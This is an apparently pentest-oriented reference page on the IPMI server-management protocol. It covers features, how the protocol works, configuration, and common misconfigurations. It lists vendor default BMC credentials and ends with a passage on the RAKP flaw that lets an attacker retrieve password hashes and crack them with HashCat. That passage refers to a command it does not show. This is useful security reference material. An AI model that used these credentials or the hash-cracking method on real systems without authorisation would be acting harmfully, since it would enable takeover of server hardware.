# Intelligent Platform Management Interface (IPMI)

- **Port Number:** 623 (UDP) and 664 (TCP)
- **Protocol:** UDP/TCP
- **Service Name:** IPMI (Intelligent Platform Management Interface)
- **Defined in:** IPMI Specification (v1.0, v2.0)

IPMI is a standardized interface used for managing and monitoring the hardware of a system, independent of the operating system, firmware, or platform. It is typically used in server environments to provide out-of-band management, meaning that administrators can manage and monitor systems remotely, even if the system is powered off or has no operating system running.

## Overview of Features

- **Out-of-Band Management:** IPMI allows administrators to manage systems remotely, regardless of the system's state (e.g., powered on, off, or unresponsive).
  
- **Hardware Monitoring:** Provides real-time monitoring of hardware components, such as temperature, fan speed, power supply, and system voltages.

- **Remote Access:** Supports remote access to system consoles, enabling administrators to troubleshoot issues even when the primary OS is not available.

- **Power Management:** Allows remote control of system power, including power on, off, reset, and cycle functions.

- **Serial over LAN (SoL):** Provides access to the server's serial console over the network, enabling remote diagnostics and troubleshooting.

- **Firmware Updates:** Supports remote firmware updates, allowing administrators to keep hardware components up-to-date without physical access to the machine.

## Typical Use Cases

- **Remote System Management:** IPMI is commonly used in data centers for managing servers remotely, reducing the need for physical access.

- **Hardware Health Monitoring:** Ensures that hardware components are operating within specified parameters, helping to prevent hardware failures.

- **Disaster Recovery:** In case of a system crash or failure, IPMI allows administrators to reboot or restore systems remotely, ensuring minimal downtime.

- **Remote Troubleshooting:** Enables diagnosing issues even when the OS is down, reducing the time to resolution for critical issues.

- **Automated Management:** Often integrated into automation tools for mass management of servers, including firmware updates, power management, and health monitoring.

## How IPMI Works

1. **Initialization:**
   - **Step 1:** The Baseboard Management Controller (BMC) initializes upon system boot. BMC is a specialized microcontroller embedded on the motherboard responsible for IPMI functions.

2. **Network Configuration:**
   - **Step 2:** The BMC configures its network interface, typically obtaining an IP address via DHCP or a statically assigned IP. This interface is used for remote communication.

3. **Establishing a Connection:**
   - **Step 3:** An administrator initiates a connection to the IPMI interface using a management tool or console over UDP port 623 (IPMI v2.0 may also use TCP port 664 for secure communication).

4. **Authentication:**
   - **Step 4:** The IPMI interface authenticates the incoming connection using credentials stored in the BMC. IPMI v2.0 supports both password-based and stronger authentication methods (e.g., RMCP+).

5. **Command Execution:**
   - **Step 5:** Once authenticated, the administrator can issue commands to the BMC, such as checking system health, viewing logs, or controlling power states.
   - **Step 6:** The BMC processes these commands and interacts with the hardware to retrieve data or execute actions.

6. **Response:**
   - **Step 7:** The BMC sends the results of the command back to the administrator, typically over the same connection, allowing for remote monitoring and management.

7. **Session Termination:**
   - **Step 8:** Once the necessary operations are completed, the session can be terminated by the administrator, or it may time out after a period of inactivity.

### Diagram (Hypothetical Example)
- **Administrator:** Connects to `<target_ip>`:623 (UDP) and authenticates.
- **BMC:** `<target_ip>` processes commands to check hardware status or control power.
- **Administrator:** Receives data or confirmation of actions from the BMC.

# Additional Information

## Security Considerations
- **Insecure by Default:** IPMI interfaces are often configured with default credentials or weak passwords, making them vulnerable to unauthorized access.

- **RMCP+ Encryption:** IPMI v2.0 introduced RMCP+ (Remote Management Control Protocol+) to provide secure communication channels, but older versions (v1.0) lack encryption, leading to potential data interception.

- **Privilege Escalation:** If an attacker gains access to the IPMI interface, they can potentially escalate privileges, as IPMI often runs with elevated access to hardware controls.

- **Firmware Vulnerabilities:** The BMC firmware may contain vulnerabilities that can be exploited to gain unauthorized access or control over the system.

## Alternatives
- **Redfish:** A newer standard for out-of-band management that offers more secure and extensible features compared to IPMI, often recommended for modern environments.

- **DRAC (Dell Remote Access Controller)** and **iLO (HP Integrated Lights-Out):** Vendor-specific solutions that provide similar functionality to IPMI but with additional features and often better security.

## Modes of Operation
- **Standard Mode:** Operates using default settings, providing basic monitoring and management functions.
  
- **Secure Mode:** Utilizes RMCP+ for encrypted communication, recommended for environments where security is a concern.

## Advanced Usage
- **Firmware Customization:** Some environments may require custom BMC firmware to support proprietary hardware or specific security features.

- **Integration with Monitoring Tools:** IPMI can be integrated with broader monitoring and management systems (e.g., Nagios, Zabbix) to provide comprehensive hardware status updates and alerts.

## Configuration Files

IPMI settings are typically managed via the BMC firmware interface, but some configurations can be set through the OS.

1. **BMC Configuration:**
- **Accessed via:** BIOS/UEFI during boot or via IPMI tools.
- **Key Settings:**
  - **Network Configuration:** Static IP or DHCP settings.
  - **User Accounts:** Configure users with various privilege levels.
  - **Encryption Settings:** Enable/disable RMCP+ and other security features.

2. **Linux Configuration:**
- **ipmitool Configuration:**
  - **File Location:** `/etc/ipmitool.conf` (if needed)
  - **Example Settings:**
    ```bash
    # IPMItool Configuration
    user=admin
    password=your_password
    host=<target_ip>
    ```
  
3. **OpenIPMI Configuration:**
  - **File Location:** `/etc/modprobe.d/openipmi.conf`
  - **Example Settings:**
    ```bash
    options ipmi_si type=kcs
    ```

## Potential Misconfigurations

1. **Default Credentials:**
   - **Risk:** Leaving the BMC configured with default credentials (`admin/admin`).
   - **Exploitation:** Attackers can easily gain access using common default credentials, leading to full control over the systemâ€™s hardware.

2. **Weak Passwords:**
   - **Risk:** Using weak or predictable passwords for BMC user accounts.
   - **Exploitation:** Attackers can perform brute-force attacks to gain access.

3. **Unrestricted Network Access:**
   - **Risk:** Exposing the IPMI interface to the public internet without adequate protection.
   - **Exploitation:** An attacker could remotely access the management interface and control the hardware.

4. **Disabled RMCP+:**
   - **Risk:** Not enabling RMCP+ on IPMI v2.0, resulting in unencrypted communication.
   - **Exploitation:** Sensitive information, including credentials, could be intercepted by attackers.

## Default Credentials

|**Username**|**Password**|**Notes**|
|-|-|
|admin|admin|Default for many BMC implementations|
|ADMIN|ADMIN|Used in some Supermicro systems|
|root|calvin|Common default on Dell DRAC systems|
|Administrator|password|Default on some older HP systems|

	```
- **Description:** If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using HashCat mode 7300. In the event of an HP iLO using a factory default password, we can use this HashCat mask attack command which tries all combinations of upper case letters and numbers for an eight-character password. There is not direct "fix" to this issue.
